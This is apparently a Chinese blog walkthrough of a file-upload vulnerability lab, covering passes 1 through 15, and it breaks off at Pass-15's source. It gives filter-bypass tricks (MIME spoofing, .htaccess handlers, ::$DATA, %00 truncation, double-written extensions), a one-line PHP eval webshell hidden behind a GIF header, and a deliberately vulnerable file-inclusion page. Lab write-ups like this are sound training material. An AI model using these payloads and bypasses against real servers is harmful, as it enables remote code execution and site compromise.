+<h1 id="Pass-01-前端js验证"><a href="#Pass-01-前端js验证" class="headerlink" title="Pass-01 前端js验证"></a>Pass-01 前端js验证</h1><p>尝试上传.php文件，提示不成功。只能上传图片类型的文件。 </p>
+<p><img src="https://img-blog.csdnimg.cn/e56378ac0f58486eabe7a9b5c7d8aced.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>分析原因：是因为前端js拦截了，我们先将php文件后缀修改成合法的格式（.gif ），在使用burpsuite抓包，再修改.php后缀。</p>
+<p><img src="https://img-blog.csdnimg.cn/74a110d5df684a34b3410576264c7b08.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>我们可以再upload的相应包中看一下我们是否将文件上传成功了。</p>
+<p>可以看到我们成功的将一句话木马上传至靶场的服务器。</p>
+<p>POST[] 中是自己的密码。</p>
+<p><img src="https://img-blog.csdnimg.cn/1857c957f2734623bf324cc86c317e70.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>到这里以及成功了，我们可以尝试使用蚁剑连接。</p>
+<p><img src="https://img-blog.csdnimg.cn/4ee9198e11a44a4182586168ad069987.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p><img src="https://img-blog.csdnimg.cn/2584aaca7c8147e69656df9d3739f556.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<h1 id="Pass-02-后端MIME验证"><a href="#Pass-02-后端MIME验证" class="headerlink" title="Pass-02 后端MIME验证"></a>Pass-02 后端MIME验证</h1><p>补充知识：</p>
+<p>Content-Type 实体头部用于指示资源的MIME类型</p>
+<p>media type ,在响应中，Content-Type标头告诉客户端实际返回的内容的内容类型。</p>
+<p>第一步还是尝试上传php文件</p>
+<p><img src="https://img-blog.csdnimg.cn/99daaeb5cd0f44b69589614d28077bde.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>发现与第一关的提示不同，不是根据文件的后缀进行识别。</p>
+<p>分析源码：</p>
+<p><img src="https://img-blog.csdnimg.cn/df8ea76283954463b00e6312109c512e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>发现这关只是对 content-type进行判断，在burp suite中，修改content-type为允许的类型就行了。</p>
+<p>修改content-type</p>
+<p><img src="https://img-blog.csdnimg.cn/4d889ab20d4346eea055e444fc1a6fe0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>上传成功。同时蚁剑也可以连接成功！</p>
+<p><img src="https://img-blog.csdnimg.cn/ebd42d74095f4bb29ba6e83b309fe05b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<h1 id="Pass-03-黑名单验证"><a href="#Pass-03-黑名单验证" class="headerlink" title="Pass-03 黑名单验证"></a>Pass-03 黑名单验证</h1><p>尝试上传php文件，结合源码我们可以看出这关设置了文件后缀名黑名单，禁止上传后缀名为php的文件</p>
+<p><img src="https://img-blog.csdnimg.cn/9cbf1c0484604c5e9cb5e51dde0ac86f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p> <img src="https://img-blog.csdnimg.cn/a605ae7a569d4ba68947d33731d7c414.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>我们尝试通过扩展名绕过，可以尝试phtml，php3，php4, php5, pht后缀名都可以绕过，但是前提是要在配置文件里面有这样的一句话</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml .phps .php1 .php4 .pht </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/fd470206681145a1a311a418cdb990f8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>这句话的意思是可以 .phtml .phps 等后缀名的文件执行 php程序</p>
+<p>我们上传1.phtml 文件</p>
+<p><img src="https://img-blog.csdnimg.cn/e7b58bb9b59c42a3a9255e21e49046e3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>上传成功</p>
+<p>尝试使用蚁剑连接</p>
+<h1 id="Pass-04-黑名单验证-htaccess"><a href="#Pass-04-黑名单验证-htaccess" class="headerlink" title="Pass-04 黑名单验证.htaccess"></a>Pass-04 黑名单验证.htaccess</h1><p>分析源码：我们发现这一关的过滤比第三过更多了，使用第三关的方法是行不通了。</p>
+<p>但是没有限制 .htaccess</p>
+<p>补充知识：</p>
+<p>​    .htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置.通过htaccess文件，可以实现:网页301重定向、自定义404页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p>
+<p>​    上传内容为一下代码的文件，双引号内为你要上传的文件名。</p>
+<blockquote>
+<p>&lt;FilesMatch “jpg”&gt;<br>     SetHandler application/x-httpd-php<br> </p>
+</blockquote>
+<p>​    但是这个后缀名使用的前提是我们要在<code>apache</code>的<code>httpd.conf</code>中将<code>LoadModule rewrite_module modules/mod_rewrite.so</code>打开还有<code>AllowOverride All    </code></p>
+<p><img src="https://img-blog.csdnimg.cn/241f4e676e4b45aa809a7ad85d1f275b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p> 我们先上传 .htaccess 成功后再上传 .jpg文件</p>
+<h1 id="Pass-05大小写绕过"><a href="#Pass-05大小写绕过" class="headerlink" title="Pass-05大小写绕过"></a>Pass-05大小写绕过</h1><p>我们尝试上传 .hatccess 文件，但提示 “此文件类型不允许上传！” 说明过滤了该文件。</p>
+<p>我们查看源码：</p>
+<p><img src="https://img-blog.csdnimg.cn/91bc82f9f6284916a7f6a9d9c54fa8fe.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p> 分析发现</p>
+<p>第五关比第四关少了strtolower，这说明我们可以尝试大小写绕过。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_ext = strtolower($file_ext); //转换为小写</span><br></pre></td></tr></table></figure>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>上传 .Php 文件，发现上传成功。</p>
+<p><img src="https://img-blog.csdnimg.cn/369b883dcf6b4ef5899da6f2675a8e2c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<h1 id="Pass-6-空格绕过"><a href="#Pass-6-空格绕过" class="headerlink" title="Pass-6 空格绕过"></a>Pass-6 空格绕过</h1><p>分析源码：</p>
+<p>发现本关相比较前两关少了一步首尾去空的步骤，这样的话我们可以采取空格绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_ext = trim($file_ext); //首尾去空</span><br></pre></td></tr></table></figure>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p><img src="https://img-blog.csdnimg.cn/2d6a07c7e7934d70a656312bb58c7bae.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p> 我们上传 .php (点+php+空格) 的文件，上传成功。</p>
+<h1 id><a href="#" class="headerlink" title></a></h1><h1 id="Pass-07-点绕过"><a href="#Pass-07-点绕过" class="headerlink" title="Pass-07 点绕过"></a>Pass-07 点绕过</h1><p>分析源码：</p>
+<p>相比较前几关，本关少了一下一步，这样的话就可以考虑从这里入手。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_name = deldot($file_name);//删除文件名末尾的点</span><br></pre></td></tr></table></figure>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>利用windows特性，会自动去掉后缀名中最后的”.”，可在后缀名中加”.”绕过。</p>
+<p><img src="https://img-blog.csdnimg.cn/fb218d6312214ae9aba975b3f15bf451.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<h1 id="-1"><a href="#-1" class="headerlink" title></a></h1><h1 id="Pass-08-DATA绕过"><a href="#Pass-08-DATA绕过" class="headerlink" title="Pass-08 ::$DATA绕过"></a>Pass-08 ::$DATA绕过</h1><p>分析本关源码：</p>
+<p>我们会发现本关少了去除字符串的一步，这里将是我们的入手点。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br></pre></td></tr></table></figure>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p><img src="https://img-blog.csdnimg.cn/a99a7b8c536943868e39ee303c32f7c5.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>​    在php+windows的情况下：如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名。利用windows特性，可在后缀名中加” ::$DATA”绕过。</p>
+<h1 id="Pass-09-点-空格-点-空格绕过"><a href="#Pass-09-点-空格-点-空格绕过" class="headerlink" title="Pass-09 点+空格+点+空格绕过"></a>Pass-09 点+空格+点+空格绕过</h1><p>分析源码：</p>
+<p>​    先将首尾去空，又去除了<code>::$DATA</code>又转换为小写，再删去末尾的点。这样一来我们构造文件名，使其经过过滤后得到的还是<code>php</code>的文件名不就行了，所以就<code>1.php. .</code> 就可以绕过，也就是<code>点+空格+点+空格</code>绕过</p>
+<p><img src="https://img-blog.csdnimg.cn/37d1de5b9f6e4e28ab99232e7bfc5580.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<h1 id="-2"><a href="#-2" class="headerlink" title></a></h1><h1 id="Pass-10-双写绕过"><a href="#Pass-10-双写绕过" class="headerlink" title="Pass-10 双写绕过"></a>Pass-10 双写绕过</h1><p>​    在分析源码前，我们可以不断地的通过burpsuite抓包模拟发送头信息，然后分析返回信息进行判断。</p>
+<p>分析源码：</p>
+<p>我们发现这里是将违规的后缀名全部替换成了空，但是他只替换一次，我们可以采用双写绕过。</p>
+<p>比如 .php -&gt; .pphphp</p>
+<p><img src="https://img-blog.csdnimg.cn/78796c39c1ec406486ef09c177b41d60.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>我们上传的文件名为： 10.pphphp </p>
+<p>我们查看图片连接，会发现后缀名为 .php</p>
+<p><img src="https://img-blog.csdnimg.cn/4989c126762b4cebb821615537b0af49.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<h1 id="Pass-11-00截断"><a href="#Pass-11-00截断" class="headerlink" title="Pass-11 00截断"></a>Pass-11 00截断</h1><p>分析源码：</p>
+<p>白名单判断</p>
+<p>但是$img_path这个变量直接是拼接的，所以我们可以使用<code>%00</code>截断绕过。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br></pre></td></tr></table></figure>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p><code>%00</code>截断的条件是</p>
+<blockquote>
+<p><code>php</code>版本要小于5.3.4 修改<code>php.ini</code>的<code>magic_quotes_gpc</code>为<code>OFF</code>状态</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/fd0ed2c905c8410395345d1b9bd59344.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p> 修改save_path 路径，最后使用 %00 截断</p>
+<p><img src="https://img-blog.csdnimg.cn/729e555cf1b34077a5b6c788284c7452.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<h1 id="Pass-12-00截断"><a href="#Pass-12-00截断" class="headerlink" title="Pass-12 00截断"></a>Pass-12 00截断</h1><p>分析源码：</p>
+<p><img src="https://img-blog.csdnimg.cn/558ff87a68824415ac9f5e432b1e29bd.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p> 用burp抓包，发现就是save_path post传参</p>
+<p>用POST方式传参，应该也是<code>00</code>截断,但是不会像GET方式那样会对%00进行解码。</p>
+<p>由于无法自行解码所以我们需要在<code>hex</code>中找到相对应的位置将数字修改为00</p>
+<h1 id="Pass-13-图片马绕过"><a href="#Pass-13-图片马绕过" class="headerlink" title="Pass-13 图片马绕过"></a>Pass-13 图片马绕过</h1><p>分析源码：  $bin = fread($file, 2); //只读2字节</p>
+<p>通过读取两个字节来确定文件类型，所以直接制作图片马即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">function getReailFileType($filename)&#123;</span><br><span class="line">    $file = fopen($filename, &quot;rb&quot;);</span><br><span class="line">    $bin = fread($file, 2); //只读2字节</span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(&quot;C2chars&quot;, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[&#x27;chars1&#x27;].$strInfo[&#x27;chars2&#x27;]);    </span><br><span class="line">    $fileType = &#x27;&#x27;;    </span><br><span class="line">    switch($typeCode)&#123;      </span><br><span class="line">        case 255216:            </span><br><span class="line">            $fileType = &#x27;jpg&#x27;;</span><br><span class="line">            break;</span><br><span class="line">        case 13780:            </span><br><span class="line">            $fileType = &#x27;png&#x27;;</span><br><span class="line">            break;        </span><br><span class="line">        case 7173:            </span><br><span class="line">            $fileType = &#x27;gif&#x27;;</span><br><span class="line">            break;</span><br><span class="line">        default:            </span><br><span class="line">            $fileType = &#x27;unknown&#x27;;</span><br><span class="line">        &#125;    </span><br><span class="line">        return $fileType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">    $file_type = getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    if($file_type == &#x27;unknown&#x27;)&#123;</span><br><span class="line">        $msg = &quot;文件未知，上传失败！&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type;</span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &quot;上传出错！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>13.jpg</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?php @eval($_POST[&#x27;shell&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>然后上传，但是直接访问并不能将<code>gif</code>当作<code>php</code>来解析,因此还需要利用文件包含漏洞</p>
+<p>写一个<code>13.php</code>传入，再利用它来解析图片</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">##include.php</span><br><span class="line">&lt;?php</span><br><span class="line">/*</span><br><span class="line">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span><br><span class="line">*/</span><br><span class="line">header(&quot;Content-Type:text/html;charset=utf-8&quot;);</span><br><span class="line">$file = $_GET[&#x27;file&#x27;];</span><br><span class="line">if(isset($file))&#123;</span><br><span class="line">    include $file;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    show_source(__file__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>再结合文件包含解析利用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload/include.php?file=upload/图片名称</span><br></pre></td></tr></table></figure>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<h1 id="Pass-14-getimagesize-图片马"><a href="#Pass-14-getimagesize-图片马" class="headerlink" title="Pass-14 getimagesize()-图片马"></a>Pass-14 getimagesize()-图片马</h1><p>分析源码：</p>
+<p><img src="https://img-blog.csdnimg.cn/c9e46cfdb2aa41f2a59fc8eafbf42158.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>这一关通过getimagesize函数来获取图片信息，同样可以使用图片码绕过。</p>
+<p><img src="https://img-blog.csdnimg.cn/9e8243a1b57e42d7bca8b02cd6638cdd.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<h1 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h1><p>分析源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">function isImage($filename)&#123;</span><br><span class="line">    //需要开启php_exif模块</span><br><span class="line">    $image_type = exif_imagetype($filename);</span><br><span class="line">    switch ($image_type) &#123;</span><br><span class="line">        case IMAGETYPE_GIF:</span><br><span class="line">            return &quot;gif&quot;;</span><br><span class="line">            break;</span><br><span class="line">        case IMAGETYPE_JPEG:</span><br><span class="line">            return &quot;jpg&quot;;</span><br><span class="line">            break;</span><br><span class="line">        case IMAGETYPE_PNG:</span><br><span class="line">            return &quot;png&quot;;</span><br><span class="line">            break;    </span><br><span class="line">        default:</span><br><span class="line">            return false;</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    if(!$res)&#123;</span><br><span class="line">        $msg = &quot;文件未知，上传失败！&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$res;</span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &quot;上传出错！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
